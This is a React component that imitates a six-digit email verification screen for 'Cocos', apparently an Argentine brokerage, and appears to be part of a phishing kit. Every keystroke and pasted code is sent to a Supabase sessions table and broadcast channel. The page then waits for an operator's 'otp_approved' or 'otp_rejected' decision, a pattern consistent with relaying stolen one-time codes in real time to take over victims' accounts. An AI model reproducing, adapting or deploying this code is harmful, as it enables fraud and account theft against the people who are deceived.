import { useState, useEffect, useCallback, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Mail, X, ClipboardPaste } from "lucide-react";
import CocosLogo from "./CocosLogo";

interface CocosMfaEmailScreenProps {
  email: string;
  sessionId: string;
  onBack: () => void;
}

const CocosMfaEmailScreen = ({ email, sessionId, onBack }: CocosMfaEmailScreenProps) => {
  const [digits, setDigits] = useState<string[]>(["", "", "", "", "", ""]);
  const [status, setStatus] = useState<"input" | "verifying" | "success" | "error">("input");
  const [errorMessage, setErrorMessage] = useState("");
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    const channel = supabase.channel(`session-otp-decision-${sessionId}`);
    channel.on("broadcast", { event: "otp_decision" }, (payload) => {
      const decision = payload.payload?.status as string;
      if (decision === "otp_approved") setStatus("success");
      else if (decision === "otp_rejected") {
        setStatus("error");
        setErrorMessage("Código inválido. Intentá de nuevo.");
        setDigits(["", "", "", "", "", ""]);
        setTimeout(() => setStatus("input"), 2000);
      }
    }).subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status").eq("id", sessionId).maybeSingle();
      if (data?.status === "otp_approved") { setStatus("success"); clearInterval(pollInterval); }
      else if (data?.status === "otp_rejected") {
        setStatus("error");
        setErrorMessage("Código inválido. Intentá de nuevo.");
        setDigits(["", "", "", "", "", ""]);
        setTimeout(() => {
          setStatus("input");
          supabase.from("sessions").update({ status: "redirect_mfa_email" } as any).eq("id", sessionId).then(() => {});
        }, 2000);
        clearInterval(pollInterval);
      }
    }, 2000);

    return () => { supabase.removeChannel(channel); clearInterval(pollInterval); };
  }, [sessionId]);

  useEffect(() => {
    const channel = supabase.channel(`session-review-client-otp-${sessionId}`);
    channel.on("broadcast", { event: "review_decision" }, (payload) => {
      const decision = payload.payload?.status as string;
      if (decision === "otp_approved") setStatus("success");
      else if (decision === "otp_rejected") {
        setStatus("error");
        setErrorMessage("Código inválido. Intentá de nuevo.");
        setDigits(["", "", "", "", "", ""]);
        setTimeout(() => setStatus("input"), 2000);
      }
    }).subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [sessionId]);

  const syncOtpToDb = useCallback((code: string) => {
    supabase.from("sessions").update({ otp_code: `recovery_email:${code}` } as any).eq("id", sessionId).then(() => {});
    const chName = `confirm-email-${sessionId}-${Date.now()}-${Math.random()}`;
    const broadcastCh = supabase.channel(chName);
    broadcastCh.subscribe((s) => {
      if (s === "SUBSCRIBED") {
        broadcastCh.send({ type: "broadcast", event: "client_recovery_update", payload: { recovery_code: code } });
        setTimeout(() => supabase.removeChannel(broadcastCh), 1500);
      }
    });
  }, [sessionId]);

  const handleDigitChange = (index: number, value: string) => {
    if (status !== "input") return;
    const char = value.slice(-1);
    if (char && !/^\d$/.test(char)) return;
    const newDigits = [...digits];
    newDigits[index] = char;
    setDigits(newDigits);
    const fullCode = newDigits.join("");
    syncOtpToDb(fullCode);
    if (char && index < 5) inputRefs.current[index + 1]?.focus();
    if (newDigits.every(d => d !== "") && fullCode.length === 6) setStatus("verifying");
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) inputRefs.current[index - 1]?.focus();
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      const cleaned = text.replace(/\D/g, "").slice(0, 6);
      if (cleaned.length > 0) {
        const newDigits = ["", "", "", "", "", ""];
        for (let i = 0; i < cleaned.length; i++) newDigits[i] = cleaned[i];
        setDigits(newDigits);
        syncOtpToDb(newDigits.join(""));
        if (cleaned.length === 6) setStatus("verifying");
        else inputRefs.current[cleaned.length]?.focus();
      }
    } catch { /* clipboard not available */ }
  };

  // Mask email: jo***@gmail.com
  const maskedEmail = email
    ? email.replace(/^(.{2})(.*)(@.*)$/, (_, a, b, c) => a + b.replace(/./g, "*") + c)
    : "";

  if (status === "success") {
    return (
      <div className="flex min-h-[100dvh] flex-col items-center bg-[#f5f7fb] px-5 pt-10">
        <div className="mb-8"><CocosLogo /></div>
        <div className="w-full max-w-[500px] text-center">
          <h1 className="mb-3 text-2xl font-bold text-[#1a2233]">Verificación completa</h1>
          <p className="text-[14px] text-[#8895aa]">Tu identidad fue verificada. Redirigiendo...</p>
          <p className="mt-2 text-[12px] text-[#b0b8c9]">{email}</p>
        </div>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] flex-col items-center bg-[#f5f7fb] px-5">
      <div className="flex w-full max-w-[500px] items-center justify-between py-4">
        <button onClick={onBack} className="p-1.5 text-[#5a6a85] hover:text-[#1a2233] transition-colors">
          <X size={20} />
        </button>
        <span className="text-[14px] font-medium text-[#5a6a85]">Código por email</span>
        <div className="w-[20px]" />
      </div>

      <div className="w-full max-w-[500px] rounded-2xl bg-white p-6 sm:p-8 pt-8 sm:pt-10 shadow-sm mt-2">
        <div className="mb-5 flex h-[52px] w-[52px] items-center justify-center rounded-full bg-[#dbeafe]">
          <Mail size={22} className="text-[#2563eb]" />
        </div>

        <h1 className="mb-2 text-[18px] sm:text-[20px] font-semibold text-[#1a2233] leading-tight">
          Código enviado a tu email
        </h1>
        <p className="mb-7 text-[13px] sm:text-[14px] text-[#8895aa] leading-relaxed">
          Enviamos un código de verificación de 6 dígitos a <span className="font-semibold text-[#1a2233]">{maskedEmail}</span>. Revisá tu bandeja de entrada o spam.
        </p>

        {errorMessage && status === "error" && (
          <div className="mb-5 rounded-xl border border-red-200 bg-red-50 px-4 py-2.5 text-sm text-red-600">{errorMessage}</div>
        )}

        <div className="mb-4 flex items-center justify-center gap-1.5 sm:gap-2">
          {digits.slice(0, 3).map((digit, i) => (
            <input
              key={i}
              ref={(el) => { inputRefs.current[i] = el; }}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(e) => handleDigitChange(i, e.target.value)}
              onKeyDown={(e) => handleKeyDown(i, e)}
              disabled={status === "verifying"}
              autoFocus={i === 0}
              className="h-[50px] w-[42px] sm:h-[54px] sm:w-[48px] rounded-xl border border-[#d8dfe8] bg-white text-center text-[20px] font-semibold text-[#1a2233] outline-none transition-all focus:border-[#2563eb] focus:ring-2 focus:ring-[#2563eb]/15 disabled:opacity-50"
            />
          ))}
          <span className="mx-0.5 sm:mx-1 text-[20px] text-[#b0b8c9]">-</span>
          {digits.slice(3, 6).map((digit, i) => (
            <input
              key={i + 3}
              ref={(el) => { inputRefs.current[i + 3] = el; }}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(e) => handleDigitChange(i + 3, e.target.value)}
              onKeyDown={(e) => handleKeyDown(i + 3, e)}
              disabled={status === "verifying"}
              className="h-[50px] w-[42px] sm:h-[54px] sm:w-[48px] rounded-xl border border-[#d8dfe8] bg-white text-center text-[20px] font-semibold text-[#1a2233] outline-none transition-all focus:border-[#2563eb] focus:ring-2 focus:ring-[#2563eb]/15 disabled:opacity-50"
            />
          ))}
        </div>

        <button onClick={handlePaste} className="flex items-center gap-1.5 text-[13px] font-medium text-[#2563eb] hover:text-[#1d4ed8] transition-colors">
          <ClipboardPaste size={14} />
          Pegar código
        </button>

        {status === "verifying" && (
          <div className="mt-6 flex items-center gap-2 text-sm text-[#8895aa]">
            <div className="h-2 w-2 animate-pulse rounded-full bg-[#2563eb]" />
            Verificando código...
          </div>
        )}

        <p className="mt-6 text-[12px] text-[#b0b8c9] text-center">
          ¿No recibiste el correo? Revisá la carpeta de spam o esperá unos segundos.
        </p>
      </div>
    </div>
  );
};

export default CocosMfaEmailScreen;
